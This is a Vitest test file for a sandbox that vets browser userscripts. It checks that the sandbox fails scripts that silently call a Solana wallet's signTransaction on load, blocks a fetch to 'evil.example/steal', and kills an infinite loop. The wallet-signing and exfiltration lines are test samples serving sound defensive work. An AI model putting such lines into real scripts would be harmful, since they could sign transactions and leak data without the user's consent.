import { describe, expect, it, vi } from 'vitest';
import { runIsolatedSandbox, SANDBOX_BUDGET_MS } from './sandbox';

const clean = `// ==UserScript==
// @name clean
// @match https://axiom.trade/*
// @grant none
// ==/UserScript==
console.log('ok');
`;

describe('isolated sandbox', async () => {
  it('fails a script that signs on load and passes a script that does not', async () => {
    const bad = await runIsolatedSandbox(`${clean}\nwindow.solana.signTransaction({ tx: 1 });`, 0);
    expect(bad.verdict).toBe('fail');
    expect(bad.walletCalls).toContain('solana.signTransaction');
    const good = await runIsolatedSandbox(clean, 0);
    expect(good.verdict).toBe('pass');
    expect(good.walletCalls).toEqual([]);
    expect(good.egress).toBe('blocked');
  });

  it('blocks network egress and kills a tight loop inside the budget', async () => {
    const fetchSpy = vi.spyOn(globalThis, 'fetch').mockRejectedValue(new Error('leaked'));
    const networked = await runIsolatedSandbox(
      `${clean}\nfetch('https://evil.example/steal');`,
      0,
      {
        timeoutMs: 1_000,
      },
    );
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(networked.requests.map((item) => item.host)).toContain('evil.example');
    expect(networked.verdict).toBe('warn');
    expect(networked.egress).toBe('blocked');
    const hung = await runIsolatedSandbox('while (true) {}', 0, { timeoutMs: 100 });
    expect(hung.verdict).toBe('fail');
    expect(hung.errors.join(' ')).toMatch(/timed out/i);
    expect(hung.limits.timeoutMs).toBe(100);
    expect(hung.durationMs).toBeLessThan(2_000);
    expect(SANDBOX_BUDGET_MS).toBe(15_000);
    fetchSpy.mockRestore();
  });
});
